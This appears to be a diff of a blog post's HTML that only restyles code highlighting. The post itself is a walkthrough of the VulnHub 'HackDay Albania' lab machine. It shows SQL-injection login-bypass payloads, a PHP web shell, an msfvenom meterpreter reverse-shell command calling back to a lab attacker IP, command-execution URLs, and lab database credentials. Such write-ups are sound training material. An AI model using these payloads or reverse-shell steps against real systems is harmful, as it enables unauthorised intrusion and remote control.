@@ -247,19 +247,19 @@ HTTP request sent, awaiting response... 404 Not Found
 </code></pre><p>Unfortunately SQLMAP was only able to verify the SQL-Injection but not exploit it - so I had to do it manually.</p>
 <p>Sending the request to Burp Intruder I tried the SQL Injection Fuzzing Payloads and it looks like the application is filtering some SQL keywords like &ldquo;AND&rdquo; and &ldquo;OR&rdquo;.</p>
 <p>Assuming the query looks something like this</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php">select junk from users where username=&#39;$_GET[&#34;username&#34;]&#39; and password=&#39;$_GET[&#34;password&#34;]&#39;;
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#a6e22e">select</span> <span style="color:#a6e22e">junk</span> <span style="color:#a6e22e">from</span> <span style="color:#a6e22e">users</span> <span style="color:#a6e22e">where</span> <span style="color:#a6e22e">username</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;$_GET[&#34;username&#34;]&#39;</span> <span style="color:#66d9ef">and</span> <span style="color:#a6e22e">password</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;$_GET[&#34;password&#34;]&#39;</span>;
 </code></pre></div><p>a simple query like</p>
 <pre><code>username'; --
 </code></pre><p>should bypass the check (note the extra space at the end).</p>
 <p>If the query works, the following SQL statement should be executed and the password check is commented out:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-SQL" data-lang="SQL"><span style="color:#66d9ef">select</span> junk <span style="color:#66d9ef">from</span> users <span style="color:#66d9ef">where</span> username<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;username&#39;</span>; <span style="color:#75715e">-- &#39; and password=&#39;&#39;;
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-SQL" data-lang="SQL"><span style="color:#66d9ef">select</span> junk <span style="color:#66d9ef">from</span> users <span style="color:#66d9ef">where</span> username<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;username&#39;</span>; <span style="color:#75715e">-- &#39; and password=&#39;&#39;;
 </span></code></pre></div><p>I tried to use users like user and admin in the query but none of them worked so I fired up Burp Intruder again to do some username enumeration.</p>
 <p>Inserting the SQL-Injection payload as username und marking the missing username as injection point Burp was able to identify a user named <code>jeff</code>.</p>
 <p><a href="/img/vulnhub_hackday_albania/user_enumeration.png"><img src="/img/vulnhub_hackday_albania/user_enumeration_thumb.png" alt="Login"></a></p>
 <p>So the final payload to bypass the login is</p>
 <pre><code>jeff'; --
 </code></pre><p>which results in the query</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-SQL" data-lang="SQL"><span style="color:#66d9ef">select</span> junk <span style="color:#66d9ef">from</span> users <span style="color:#66d9ef">where</span> username<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;jeff&#39;</span>;
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-SQL" data-lang="SQL"><span style="color:#66d9ef">select</span> junk <span style="color:#66d9ef">from</span> users <span style="color:#66d9ef">where</span> username<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;jeff&#39;</span>;
 </code></pre></div><p>We are greeted with a ticket system with the ability to upload files. I first tried to upload a simple PHP shell but the application responds with an error message saying only graphic files with certain extensions are allowed. Trying to simply change the <code>Content-Type</code> header does not work so I decided to upload a normal image to see how the application behaves.
 After uploading we can call the ticket details and check out the image url.
 The image is included with the following URL which renders the image as text so this could be a simple PHP include vulnerability.</p>
@@ -270,8 +270,8 @@ The image is included with the following URL which renders the image as text so 
 </code></pre><p>we are able to execute commands as the www-data user.</p>
 <pre><code>uid=33(www-data) gid=33(www-data) groups=33(www-data)
 </code></pre><p>shell.php content:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-PHP" data-lang="PHP"><span style="color:#75715e">&lt;?php</span> <span style="color:#66d9ef">echo</span> <span style="color:#a6e22e">shell_exec</span>($_GET[<span style="color:#e6db74">&#39;cmd&#39;</span>]); <span style="color:#75715e">?&gt;</span>
-</code></pre></div><p>To make things easier I created a meterpreter binary with a jpg extension and uploaded it with a new ticket:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-PHP" data-lang="PHP"><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span> <span style="color:#66d9ef">echo</span> <span style="color:#a6e22e">shell_exec</span>($_GET[<span style="color:#e6db74">&#39;cmd&#39;</span>]); <span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
+</span></code></pre></div><p>To make things easier I created a meterpreter binary with a jpg extension and uploaded it with a new ticket:</p>
 <pre><code>msfvenom -p linux/x86/meterpreter/reverse_tcp -f elf -o meterpreter.jpg LHOST=192.168.56.102 LPORT=1337
 </code></pre><p>After making the binary executable with</p>
 <pre><code>http://192.168.56.101:8008/unisxcudkqjydw/vulnbank/client/view_file.php?filename=shell.jpg&amp;cmd=chmod%20%2bx%20./upload/meterpreter.jpg
@@ -296,18 +296,18 @@ Meterpreter  : x86/linux
 meterpreter &gt; getuid
 Server username: uid=33, gid=33, euid=33, egid=33, suid=33, sgid=33
 </code></pre><p>We can now take a closer look at the SQL-Injection filtering and after looking at the files we can see whats going on in <code>config.php</code>:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php">function check_login($username,$password){
-  $username = str_ireplace(&#34;OR&#34;, &#34;&#34;, $username);
-  $username = str_ireplace(&#34;UNION&#34;, &#34;&#34;, $username);
-  $username = str_ireplace(&#34;AND&#34;, &#34;&#34;, $username);
-  $password = str_ireplace(&#34;&#39;&#34;,&#34;&#34;,$password);
-  $sql_query = &#34;SELECT ID FROM klienti where `username` = &#39;$username&#39; and `password` = &#39;$password&#39;;&#34;;
-  $result = mysqli_fetch_assoc(execute_query($sql_query));
-  $result = $result[&#34;ID&#34;];
-  if($result &gt;= 1){
-    return $result;
-  }else{
-    return -1;
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">check_login</span>($username,$password){
+  $username <span style="color:#f92672">=</span> <span style="color:#a6e22e">str_ireplace</span>(<span style="color:#e6db74">&#34;OR&#34;</span>, <span style="color:#e6db74">&#34;&#34;</span>, $username);
+  $username <span style="color:#f92672">=</span> <span style="color:#a6e22e">str_ireplace</span>(<span style="color:#e6db74">&#34;UNION&#34;</span>, <span style="color:#e6db74">&#34;&#34;</span>, $username);
+  $username <span style="color:#f92672">=</span> <span style="color:#a6e22e">str_ireplace</span>(<span style="color:#e6db74">&#34;AND&#34;</span>, <span style="color:#e6db74">&#34;&#34;</span>, $username);
+  $password <span style="color:#f92672">=</span> <span style="color:#a6e22e">str_ireplace</span>(<span style="color:#e6db74">&#34;&#39;&#34;</span>,<span style="color:#e6db74">&#34;&#34;</span>,$password);
+  $sql_query <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;SELECT ID FROM klienti where `username` = &#39;</span><span style="color:#e6db74">$username</span><span style="color:#e6db74">&#39; and `password` = &#39;</span><span style="color:#e6db74">$password</span><span style="color:#e6db74">&#39;;&#34;</span>;
+  $result <span style="color:#f92672">=</span> <span style="color:#a6e22e">mysqli_fetch_assoc</span>(<span style="color:#a6e22e">execute_query</span>($sql_query));
+  $result <span style="color:#f92672">=</span> $result[<span style="color:#e6db74">&#34;ID&#34;</span>];
+  <span style="color:#66d9ef">if</span>($result <span style="color:#f92672">&gt;=</span> <span style="color:#ae81ff">1</span>){
+    <span style="color:#66d9ef">return</span> $result;
+  }<span style="color:#66d9ef">else</span>{
+    <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
   }
 }
 </code></pre></div><p>Before executing the query the <code>OR</code>, <code>UNION</code> and <code>AND</code> keywords are removed and also the <code>'</code> is stripped from the password parameter.</p>
@@ -356,10 +356,10 @@ taviso:x:1000:
 lpadmin:x:117:taviso
 sambashare:x:118:taviso
 </code></pre><p>Looking for a way to become the user taviso I noticed the webapp is using the mysql root user to connect to the database.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php">$db_host = &#34;127.0.0.1&#34;;
-$db_name = &#34;bank_database&#34;;
-$db_user = &#34;root&#34;;
-$db_password = &#34;NuCiGoGo321&#34;;
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php">$db_host <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;127.0.0.1&#34;</span>;
+$db_name <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;bank_database&#34;</span>;
+$db_user <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;root&#34;</span>;
+$db_password <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;NuCiGoGo321&#34;</span>;
 </code></pre></div><p>Trying to login:</p>
 <pre><code>mysql -u root -pNuCiGoGo321
 </code></pre><p>Sadly there was no other content in the database and I did not want to try the latest mysql server race condition privescs because I thought that&rsquo;s lame and there has to be another way. But hey, at least we now have the valid logins for all users:</p>
